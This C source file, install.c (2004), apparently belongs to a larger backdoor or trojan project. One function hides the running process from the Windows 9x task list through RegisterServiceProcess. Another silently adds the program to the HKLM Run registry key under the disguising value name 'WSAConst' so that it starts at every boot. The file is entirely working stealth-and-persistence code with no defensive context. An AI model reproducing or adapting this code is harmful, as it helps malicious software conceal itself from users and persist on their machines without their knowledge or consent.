/*++ 

  Module Name:
  
	install.c

  Abstract:

	This source contain the procs to hide and install the executable
	on the system.

  Author:

	Daniel Koch (Backz)

  History:

	May-2004 Daniel K.
		Created.

--*/

#include <windows.h>
#include "install.h"
#include "../common/show_error.h"

// Set the process as service if running in Win9x
// This function return: -1 if system isn't 9x, 0 if error
// and 1 if successful
int hide_process(void) 
{
	DWORD wVersion = GetVersion();
	int wrVersion = (DWORD)(LOBYTE(LOWORD(wVersion)));

	if(wrVersion != 4) return -1;
	else
	{
		// if windows running is 9x! ...
        HMODULE hMod;
		REGISTER_PROCESS_T RegisterServiceProcess; 

		hMod = LoadLibrary("kernel32.dll");
		if(!hMod)
		{
			show_error("Error: impossible to register process as service!");
			return 0;
		}

		RegisterServiceProcess = (REGISTER_PROCESS_T) GetProcAddress(hMod, "RegisterServiceProcess");
		if(!RegisterServiceProcess)
		{
			show_error("Error: impossible to find RegisterServiceProcess");
			return 0;
		}
		
		RegisterServiceProcess(GetCurrentProcessId(), RSP_SIMPLE_SERVICE);
		FreeLibrary(hMod);
	}
	return 1;
}

// This function install the current executable on
// startup key in windows registry
void install_startup(void)
{
	HKEY key;
	TCHAR filename[MAX_PATH];
	const char *key_name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	// openning the key
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, key_name, 0, KEY_ALL_ACCESS, &key);

	// getting module filename
	GetModuleFileName(NULL, filename, MAX_PATH);

	// adding value
	RegSetValueEx(key, "WSAConst", 0, REG_SZ, filename, lstrlen(filename));

	RegFlushKey(key);
	RegCloseKey(key);

}

